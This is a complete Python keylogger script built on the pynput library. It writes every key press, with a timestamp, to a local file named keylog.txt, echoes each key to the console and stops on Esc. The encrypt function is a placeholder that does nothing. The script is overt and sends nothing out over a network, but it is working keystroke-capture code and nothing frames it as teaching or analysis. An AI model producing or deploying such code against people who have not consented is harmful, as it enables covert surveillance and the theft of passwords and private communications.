from pynput.keyboard import Key, Listener
import logging
import datetime

log_file = "keylog.txt"

def encrypt(text):

    return text

def log_keystroke(key):
    try:
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key}\n")
            print(f"Logged: {key}")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def on_press(key):
    try:
        log_keystroke(key.char)
    except AttributeError:
        if key == Key.space:
            log_keystroke("SPACE")
        elif key == Key.enter:
            log_keystroke("ENTER")
        else:
            log_keystroke(str(key))

def on_release(key):
    if key == Key.esc:
        return False

def main():
    print("Keylogger started. Press 'Esc' to stop.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
